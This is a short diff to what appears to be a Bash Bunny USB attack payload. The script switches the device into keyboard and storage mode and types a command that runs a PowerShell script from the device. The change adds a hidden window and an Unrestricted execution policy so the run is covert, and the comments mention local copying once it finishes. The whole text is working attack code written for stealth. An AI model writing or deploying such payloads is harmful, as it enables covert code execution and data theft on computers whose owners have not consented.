@@ -2,7 +2,7 @@
 GET SWITCH_POSITION
 LED ATTACK
 ATTACKMODE HID STORAGE
-RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\p.ps1')"
+RUN WIN powershell -w h -ExecutionPolicy Unrestricted ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\p.ps1')"
 LED #blue blink
 DELAY #however long testing takes for it to finish on average
 LED #local copying and other things would be complete
